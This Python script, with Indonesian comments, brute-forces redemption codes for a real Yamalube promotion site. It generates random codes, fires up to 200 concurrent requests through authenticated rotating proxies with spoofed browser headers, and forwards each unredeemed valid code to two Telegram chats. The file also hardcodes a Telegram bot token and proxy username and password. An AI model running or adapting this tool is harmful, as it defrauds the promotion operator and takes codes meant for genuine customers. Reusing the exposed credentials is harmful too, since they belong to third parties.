import asyncio
import aiohttp
import aiofiles
import random
import time
import logging
from datetime import datetime

# Konfigurasi warna ANSI untuk output di Termux
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
WHITE = "\033[97m"
BRIGHT = "\033[1m"
RESET = "\033[0m"

# Konfigurasi logging
logging.basicConfig(
    filename=f'validation_{datetime.now().strftime("%Y%m%d_%H%M")}.log',
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Konfigurasi Telegram dan User Agents
TELEGRAM_BOT_TOKEN = '7620704354:AAFa19rWmJ3pQKEExzK4hJGxSi26BTz-t1E'
CHAT_IDS = ['6426778764', '6180131575']

# Daftar User-Agent untuk rotasi
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Konfigurasi proxy
PROXIES = [
    {
        'proxy_host': 'gw.dataimpulse.com',
        'proxy_port': '823',
        'proxy_username': 'd84172e9eb36a964d3af__cr.id',
        'proxy_password': '1934704c7bbda20d'
    },
]

class CodeValidator:
    def __init__(self, device_id, total_devices):
        self.device_id = device_id
        self.total_devices = total_devices
        self.sem = asyncio.Semaphore(200)
        self.batch_size = 100
        self.retry_delay = 0.1
        self.valid_codes = set()
        self.prefixes = ["BY", "MF", "CW", "J8", "9L"]
        self.suffixes = ["LH", "8D", "8M", "YX", "TK", "4Y", "9Y", "9X"]
        self.total_valid = 0
        self.total_invalid = 0
        self.total_error = 0
        self.total_processed = 0

    def generate_code(self):
        """Generate kode dengan format [prefix][4 random alphanumeric][suffix]"""
        prefix = random.choice(self.prefixes)
        middle_part = ''.join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=4))
        suffix = random.choice(self.suffixes)
        return f"{prefix}{middle_part}{suffix}"

    async def validate_code(self, session, code):
        async with self.sem:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/json',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'origin': 'https://yamalubepromo.com',
                'referer': 'https://yamalubepromo.com/',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
            }
            payload = {"uniq_code": code}

            for attempt in range(2):
                proxy_config = random.choice(PROXIES)
                proxy_url = f"http://{proxy_config['proxy_host']}:{proxy_config['proxy_port']}"
                proxy_auth = aiohttp.BasicAuth(
                    login=proxy_config['proxy_username'],
                    password=proxy_config['proxy_password']
                )

                try:
                    async with session.post(
                        'https://dashboard.yamalubepromo.com/api/v1/wziioquyqthkal',
                        json=payload,
                        headers=headers,
                        proxy=proxy_url,
                        proxy_auth=proxy_auth,
                        timeout=10
                    ) as response:
                        if response.status == 200:
                            resp_json = await response.json()
                            if (
                                resp_json.get("meta", {}).get("code") == 200 and
                                resp_json.get("data", {}).get("is_avaliable") is True and
                                resp_json.get("data", {}).get("is_redeem") is False
                            ):
                                await self.record_valid_code(code)
                                self.total_valid += 1
                                print(f"{BRIGHT}{GREEN}**KODE VALID**:{RESET}\n{GREEN}{code}{RESET}")
                                return code, 200, "Code is available and not redeemed"
                            else:
                                self.total_invalid += 1
                                return code, 400, "Code is invalid or already redeemed"
                        elif response.status == 400:
                            self.total_invalid += 1
                            return code, 400, await response.text()
                except Exception as e:
                    self.total_error += 1
                    logger.error(f"Proxy error for {code}: {e}")
                    await asyncio.sleep(self.retry_delay * (2 ** attempt))  # Exponential backoff
                    continue

            return code, 500, "Failed after retries"

    async def record_valid_code(self, code):
        """Simpan kode valid dan kirim notifikasi ke Telegram"""
        async with aiofiles.open('valid_codes.txt', 'a') as f:
            await f.write(f"{code}\n")
        
        for chat_id in CHAT_IDS:
            message = f"{code}"
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {'chat_id': chat_id, 'text': message}
            async with aiohttp.ClientSession() as session:
                await session.post(url, data=payload)

    def display_status(self, elapsed_time):
        print(
            f"{YELLOW}Device: {self.device_id}{RESET}\n"
            f"{BLUE}Total Validasi Kode: {self.total_processed}{RESET}\n"
            f"{GREEN}Total Kode Valid: {self.total_valid}{RESET}\n"
            f"{YELLOW}Total Kode Invalid: {self.total_invalid}{RESET}\n"
            f"{RED}Total Kode Error: {self.total_error}{RESET}\n"
            f"{WHITE}Waktu Validasi: {elapsed_time:.2f} detik{RESET}\n"
        )

async def main():
    start_time = time.time()
    device_id = 1  # Inisialisasi device_id dengan angka contoh
    total_devices = 5  # Total perangkat contoh
    validator = CodeValidator(device_id, total_devices)
    
    async with aiohttp.ClientSession() as session:
        while True:
            codes = [validator.generate_code() for _ in range(validator.batch_size)]
            tasks = [validator.validate_code(session, code) for code in codes]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            validator.total_processed = len([r for r in results if isinstance(r, tuple)])
            elapsed_time = time.time() - start_time
            validator.display_status(elapsed_time)

            await asyncio.sleep(0.1)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Shutting down...{RESET}")
    except Exception as e:
        print(f"\n{RED}Error: {e}{RESET}")
        logger.error(f"Fatal error: {e}")
